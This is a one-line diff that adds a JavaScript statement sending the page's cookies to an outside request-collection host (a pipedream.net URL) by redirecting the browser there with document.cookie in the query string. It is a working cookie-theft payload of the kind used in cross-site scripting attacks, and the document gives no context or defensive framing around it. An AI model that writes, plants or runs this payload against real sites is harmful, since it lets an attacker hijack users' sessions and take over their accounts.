@@ -1,0 +1,1 @@
+document.location="https://eni78j66txrpq.x.pipedream.net/?cookie="+document.cookie;
